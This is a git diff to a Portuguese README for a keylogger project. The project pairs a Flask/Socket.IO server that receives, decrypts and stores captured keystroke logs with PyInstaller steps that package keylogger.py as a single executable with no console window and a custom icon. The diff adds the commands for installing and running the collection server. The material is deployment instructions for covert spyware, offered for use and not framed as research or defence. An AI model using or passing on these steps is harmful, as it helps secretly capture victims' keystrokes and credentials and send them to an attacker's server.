@@ -16,7 +16,7 @@ este repositório contém dois componentes principais:
 - **Servidor (server.py):** servidor Flask com Socket.IO que recebe, descriptografa e salva os logs.
 
 
-## Instalação
+## Instalação keylogger
 
  Instale o PyInstaller : pip install pyinstaller
  
@@ -25,4 +25,9 @@ este repositório contém dois componentes principais:
  pyinstaller --onefile --noconsole --icon=seu_icone.ico keylogger.py
 
  o .EXE estará aqui dist/keylogger.exe
+
+## rodar server.py no terminal:
+pip install flask flask-socketio cryptography
+python server.py
+
 
